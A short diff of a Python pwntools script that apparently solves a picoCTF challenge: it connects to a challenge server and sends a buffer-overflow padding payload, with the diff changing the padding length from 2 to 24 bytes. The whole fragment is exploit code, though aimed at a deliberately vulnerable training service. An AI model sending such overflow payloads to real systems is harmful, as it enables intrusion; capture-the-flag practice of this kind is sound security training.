@@ -219,7 +219,7 @@ from pwn import *
 
 p = remote('saturn.picoctf.net', 58903)
 
-payload = b'A'*2
+payload = b'A'*24
 payload += b'A'  # chr(0x41) 
 
 p.sendline(payload)
